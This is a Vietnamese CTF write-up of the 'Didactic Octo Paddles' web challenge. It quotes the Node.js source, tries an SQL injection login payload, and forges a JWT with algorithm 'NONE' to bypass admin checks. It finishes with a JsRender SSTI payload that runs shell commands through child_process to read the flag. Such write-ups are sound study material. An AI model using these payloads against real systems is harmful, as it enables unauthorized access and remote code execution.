# Writeup-Cyber-Apocalypse
<img width="668" height="402" alt="image" src="https://github.com/user-attachments/assets/b8d6d668-e7a4-4fba-bf88-aef16ebc8476" /> <br>
## Writeup 
> Lưu ý: Đây là 1 sự kiện CTF cũ và tôi đã build lại cục bộ của mình để giải quyết và luyện tập về nó. <br>
> Web
  1. Passman
  2. Orbital
  3. Didactic Octo Paddles
## Didactic Octo Paddles
#### Tổng quan
> Độ khó chung với tôi (From 1-10 stars): ★★★★★★☆☆☆☆
#### Lý lịch
> Bạn được Bộ Gián điệp Liên Thiên hà thuê để thu hồi một di vật hùng mạnh được cho là ẩn giấu trong một cửa hàng mái chèo nhỏ bên bờ sông. Bạn phải hack vào hệ thống của cửa hàng mái chèo để lấy thông tin về vị trí của di vật. Thử thách cuối cùng của bạn là vô hiệu hóa các tàu ký sinh ngoài hành tinh và cứu nhân loại khỏi sự hủy diệt chắc chắn bằng cách thu hồi di vật ẩn giấu trong cửa hàng Mái chèo Bạch tuộc Didactic.<br>
<img width="524" height="683" alt="image" src="https://github.com/user-attachments/assets/5af6c993-0cca-46f0-b6b7-fee4314e53c5" /> <br>
#### Sự liệt kê
Trang chủ: <br>
<img width="911" height="497" alt="image" src="https://github.com/user-attachments/assets/adc25759-3ef1-48b8-a9da-97ccada36d0d" /> <br>
Đập vào mắt mình là 1 form login với tôi mọi khi thấy form login tôi sẽ thử tải trọng <b>' OR 1=1-- -</b> để bỏ qua nó nhưng với không khi tôi xác thực với tải trọng đó nó báo lỗi <br>
<img width="850" height="452" alt="image" src="https://github.com/user-attachments/assets/d921d9be-dd80-4956-acfb-59a1fc93b4b1" /> <br>
Không được. Chúng ta cùng đọc <a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/Cyber-Apocalypse-2023/Didactic-Octo-Paddles/web_didactic_octo_paddle/web_didactic_octo_paddle">mã nguồn</a> <br>
Sau khi xem xét mã nguồn chúng ta có thể đăng kí 1 tài khoản tại (<b>routes/index.js</b>) <br>
```js
 router.post("/register", async (req, res) => {
        try {
            const username = req.body.username;
            const password = req.body.password;

            if (!username || !password) {
                return res
                    .status(400)
                    .send(response("Username and password are required"));
            }

            const existingUser = await db.Users.findOne({
                where: { username: username },
            });
            if (existingUser) {
                return res
                    .status(400)
                    .send(response("Username already exists"));
            }

            await db.Users.create({
                username: username,
                password: bcrypt.hashSync(password),
            }).then(() => {
                res.send(response("User registered succesfully"));
            });
        } catch (error) {
            console.error(error);
            res.status(500).send({
                error: "Something went wrong!",
            });
        }
    });
```
<img width="668" height="382" alt="image" src="https://github.com/user-attachments/assets/f16e85e2-a408-409c-bacb-ab4882d12234" /> <br>
Đăng kí thành công chúng ta cùng đăng nhập vào tài khoản và ở đây sẽ xuất hiện 1 cửa hàng với các product <br>
<img width="920" height="486" alt="image" src="https://github.com/user-attachments/assets/0aa70bab-8272-463c-823c-00545ebd5656" /> <br>
Tại (<b>routes/index.js</b>) có tuyến đường admin<br>
```js
    router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```
Nó được xác thực bằng (AdminMiddleware) chúng ta cùng xem xét nó tại (<b>middleware/AdminMiddleware.js</b>) như sau: <br>
```js
const jwt = require("jsonwebtoken");
const { tokenKey } = require("../utils/authorization");
const db = require("../utils/database");

const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};

module.exports = AdminMiddleware;
``` 
Ở đây nó sẽ dùng giải mã token nếu header thuật toán mà bằng giá trị <b>none</b> nó sẽ chuyển hướng chúng ta về login còn nếu mà <b>HS256</b> nó sẽ tìm kiếm user và sử dụng hàm verify để xác thực vậy mục tiêu bây giờ chúng ta cần làm gì để bypass xác thực được admin sau khi loay hoay tìm hiểu tôi phát hiện ra 1 thuật toán <b>NONE</b> có thể bypass và nó khác với <b>none</b> đúng không chúng ta cùng thử nghiệm điều đó session sau khi giải mã: <br> 
<img width="923" height="320" alt="image" src="https://github.com/user-attachments/assets/ccd59297-76e9-4532-b02b-5ce73b174b54" /> <br>
Vâng tôi đã bỏ qua được điều đó và truy cập vào /admin: <br>
<img width="923" height="541" alt="image" src="https://github.com/user-attachments/assets/169e7ca0-8f70-482f-bf0d-3ca218f3adcf" /> <br>
Và sau đó chúng ta hãy lùi lại 1 bước ở mã nguồn admin: <br>
```js
 router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```
Nó dùng <b>jsrender.templates</b> để hiển thị tên người dùng vậy liệu nó có lỗ hổng <b>SSTI</b> ở view hiển thị nó như sao:<br>
```html
<body>
  <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
    <h1>Active Users</h1>
    <ul class="list-group small-list">
      {{for users.split(',')}}
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>{{>}}</span>
        </li>
      {{/for}}
    </ul>
  </div>
</body>
```
sau đó tôi tìm kiếm <a href="https://appcheck-ng.com/template-injection-jsrender-jsviews/">jsrender ssti</a> Trong blog đó, có một tải trọng JsRender SSTI RCE và ghi như sau: .<br>
>Các công cụ tạo mẫu như JsRender cho phép nhà phát triển tạo một mẫu tĩnh để hiển thị trang HTML và nhúng dữ liệu động bằng Biểu thức Mẫu. Thông thường, các công cụ tạo mẫu sử dụng một biến thể của cú pháp đóng ngoặc nhọn để nhúng dữ liệu động; trong JsRender, thẻ "evaluate" có thể được sử dụng để hiển thị kết quả của một biểu thức JavaScript.<br>
<img width="523" height="238" alt="image" src="https://github.com/user-attachments/assets/745bf759-2b8e-40bb-a713-262476c655c7" /> <br>
> Do tính chất phản chiếu của JavaScript, ta có thể thoát khỏi ngữ cảnh hạn chế này . Một phương pháp để đạt được điều này là truy cập “constructor”thuộc tính đặc biệt của một hàm JavaScript tích hợp sẵn, cho phép ta truy cập vào hàm được sử dụng để tạo hàm (hoặc đối tượng) mà ta đang tham chiếu đến. Ví dụ: một số đối tượng JavaScript bao gồm chuỗi có một hàm mặc định được đặt tên toString()mà ta có thể tham chiếu trong biểu thức được chèn, ví dụ:\{\{:"test".toString()\}\} <br>
> Từ đây, chúng ta có thể truy cập hàm constructorcho phép chúng ta xây dựng một hàm mới bằng cách gọi hàm đó. Trong ví dụ này, chúng ta tạo một hàm ẩn danh được thiết kế để hiển thị hộp cảnh báo JavaScript. <br>
Và sau khi loay hoay tìm payload tôi có được tải trọng này hoạt động vì trong môi trường Node.js chúng ta có thể RCE thực thi (<b>cat /etc/passwd</b>) và chúng ta có thể đăng kí 1 tải khoản với username để get FLAG<br>
Tải trọng:<b>
```js
\{\{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()\}\}
```
Sau đó chúng ta cùng truy cập lại tài khoản đã tạo trước đó sửa đổi thuật toán như khi trước thực hiện và truy xuất flag <br>
```html
<li class="list-group-item d-flex justify-content-between align-items-center ">
    <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
    </span>
</li>
```
> Flag: HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}<br>
## Tổng Kết <br>
> Những gì tôi học được như sau: <br>
> 1. Bỏ qua tiêu đề thuật toán <b>"JWT":"NONE"</b><br>
> 2. Khai thác RCE thông qua JsRender SSTI<br>











